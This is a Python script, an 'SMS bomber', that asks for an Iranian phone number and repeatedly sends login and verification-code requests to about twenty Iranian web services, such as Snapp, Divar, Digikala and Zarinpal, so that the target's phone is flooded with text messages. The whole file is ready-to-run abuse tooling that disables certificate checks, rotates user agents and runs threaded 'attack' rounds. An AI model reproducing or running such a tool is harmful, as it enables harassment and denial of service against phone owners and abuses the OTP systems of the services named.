"""
    ULTIMATE SMS BOMBER V1- Cheatload 
    Without indentation errors - Guaranteed to work
"""

import requests
import random
import urllib3
import os
import sys
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
from re import match, sub

urllib3.disable_warnings()

# Colors
g = '\033[92m'
r = '\033[91m'
y = '\033[93m'
w = '\033[0m'

# Session
session = requests.Session()
session.verify = False

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
]

def is_phone(phone):
    phone = sub(r"\s+", "", phone.strip())
    if match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    return False

# ==================== SERVICES ====================

def snap(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"cellphone": f"+98{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Snap{w}")
            return True
    except:
        pass
    return False

def gap(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = f"https://core.gap.im/v1/user/add.json?mobile=%2B{phone_num}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = session.get(url, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Gap{w}")
            return True
    except:
        pass
    return False

def tap30(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://tap33.me/api/v2/user"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"credential": {"phoneNumber": f"0{phone_num}", "role": "PASSENGER"}}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Tap30{w}")
            return True
    except:
        pass
    return False

def divar(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://api.divar.ir/v5/auth/authenticate"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone": phone_num}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Divar{w}")
            return True
    except:
        pass
    return False

def torob(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = f"https://api.torob.com/a/phone/send-pin/?phone_number=0{phone_num}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = session.get(url, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Torob{w}")
            return True
    except:
        pass
    return False

def snapfood(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass"
        params = {"cellphone": f"0{phone_num}", "client": "WEBSITE"}
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = session.post(url, params=params, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ SnapFood{w}")
            return True
    except:
        pass
    return False

def sheypoor(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://www.sheypoor.com/auth"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"username": f"0{phone_num}"}
        r = session.post(url, data=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Sheypoor{w}")
            return True
    except:
        pass
    return False

def alibaba(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phoneNumber": f"0{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Alibaba{w}")
            return True
    except:
        pass
    return False

def smarket(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone_num}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = session.post(url, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ SnapMarket{w}")
            return True
    except:
        pass
    return False

def filmnet(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = f"https://api-v2.filmnet.ir/access-token/users/{phone_num}/otp"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = session.get(url, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Filmnet{w}")
            return True
    except:
        pass
    return False

def digikala(phone):
    try:
        phone_num = phone.replace("+98", "0")
        url = "https://api.digikala.com/v1/user/authenticate/"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"username": phone_num, "otp": "login"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Digikala{w}")
            return True
    except:
        pass
    return False

def filimo(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://api.filimo.com/api/fa/v1/send_verification_code"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone_number": f"+98{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Filimo{w}")
            return True
    except:
        pass
    return False

def namava(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://www.namava.ir/api/v1.0/accounts/verification/send"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"UserName": f"0{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Namava{w}")
            return True
    except:
        pass
    return False

def telewebion(phone):
    try:
        phone_num = phone.replace("+98", "0")
        url = "https://www.telewebion.com/fa/phone-login"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone_number": phone_num}
        r = session.post(url, data=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Telewebion{w}")
            return True
    except:
        pass
    return False

def jobinja(phone):
    try:
        phone_num = phone.replace("+98", "0")
        url = "https://jobinja.ir/api/send-token"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"mobile": phone_num, "type": "login"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Jobinja{w}")
            return True
    except:
        pass
    return False

def tapsi(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://api.tapsi.cab/api/v2.1/user/phone/send-code"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone": f"0{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Tapsi{w}")
            return True
    except:
        pass
    return False

def alopeyk(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://alopeyk.com/api/v2/auth/send-verification"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone": f"0{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ AloPeyk{w}")
            return True
    except:
        pass
    return False

def balad(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://balad.ir/api/v1/auth/otp"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone": f"+98{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Balad{w}")
            return True
    except:
        pass
    return False

def neshan(phone):
    try:
        phone_num = phone.replace("+98", "")
        url = "https://api.neshan.org/v1/auth/otp"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"phone": f"0{phone_num}"}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Neshan{w}")
            return True
    except:
        pass
    return False

def zarinpal(phone):
    try:
        phone_num = phone.replace("+98", "0")
        url = "https://api.zarinpal.com/otp/v1/send"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {"mobile": phone_num}
        r = session.post(url, json=data, headers=headers, timeout=3)
        if r.status_code < 400:
            print(f"{g}✓ Zarinpal{w}")
            return True
    except:
        pass
    return False

# ==================== COLLECT SERVICES ====================

ALL_SERVICES = [
    snap, gap, tap30, divar, torob, snapfood, sheypoor, alibaba,
    smarket, filmnet, digikala, filimo, namava, telewebion, jobinja,
    tapsi, alopeyk, balad, neshan, zarinpal
]

# ==================== ATTACK FUNCTION ====================

def attack_round(phone, round_num, total_rounds):
    print(f"\n{y}--- ROUND {round_num}/{total_rounds} ---{w}\n")
    
    successful = 0
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(service, phone): service.__name__ for service in ALL_SERVICES}
        for future in as_completed(futures):
            try:
                if future.result():
                    successful += 1
            except:
                pass
    
    print(f"\n{g}✅ Round {round_num}: {successful}/{len(ALL_SERVICES)} successful{w}")
    return successful

# ==================== MAIN ====================

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"""
{g}{'='*60}{w}
{g}      SMS BOMBER - God VERSION (NO ERRORS|cheatload-mhtyx){w}
{g}{'='*60}{w}
    """)
    
    while True:
        phone = input(f"{y}Phone number (e.g., 9123456789): {w}").strip()
        phone = is_phone(phone)
        if phone:
            break
        print(f"{r}Invalid number!{w}")
    
    try:
        rounds = int(input(f"{y}Rounds (default 3): {w}") or "3")
    except:
        rounds = 3
    
    print(f"\n{r}Starting attack on {phone} - {rounds} rounds{w}\n")
    
    total = 0
    for i in range(1, rounds+1):
        total += attack_round(phone, i, rounds)
        if i < rounds:
            sleep(2)
    
    print(f"\n{g}{'='*60}{w}")
    print(f"{g}✅ FINAL: {total}/{rounds * len(ALL_SERVICES)} SMS sent{w}")
    print(f"{g}{'='*60}{w}\n")
    
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()


